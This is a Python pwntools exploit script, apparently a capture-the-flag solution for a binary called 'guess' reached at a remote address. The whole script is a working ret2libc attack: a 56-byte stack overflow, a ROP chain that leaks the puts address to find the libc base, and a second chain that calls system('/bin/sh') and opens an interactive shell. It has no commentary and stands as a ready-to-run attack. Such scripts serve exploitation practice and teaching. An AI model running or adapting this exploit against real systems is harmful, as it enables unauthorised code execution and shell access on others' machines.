from pwn import *
import os
local = 0
if local :
    a=process("./guess")
    libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")
else:
    a=remote("172.1.14.6","8888")
    libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")
    #libc=ELF("")
context.terminal=["tmux","splitw","-h"]
elf=ELF("./guess")
def debug():
    gdb.attach(a,'''
    b *(0x000000000400721)
    ''')

#payload='A'*(0x30-4)+p32(0x41348000)
#print payload
a.recvuntil("Let's guess the number.\n")
pop_rdi_ret=0x0000000000400793
pop_rsi_pop_15_ret=0x0000000000400791
pop_rbp_ret=0x00000000004005e0
puts_got=elf.got["puts"]
puts_plt=elf.plt["puts"]
payload='A'*56
payload+=p64(pop_rdi_ret)
payload+=p64(puts_got)
payload+=p64(puts_plt)
payload+=p64(0x000000000400580)#ss
a.sendline(payload)
a.recvuntil("Its value should be 11.28125\n")
libc_base=u64(a.recv(6).ljust(8,'\x00'))-libc.symbols["puts"]
success("libc_base ==> 0x%x"%libc_base)
system_addr=libc_base+libc.symbols["system"]
sh_addr=libc_base+next(libc.search("/bin/sh"))
payload='A'*56
payload+=p64(pop_rdi_ret)
payload+=p64(sh_addr)
payload+=p64(system_addr)
a.sendline(payload)
a.interactive()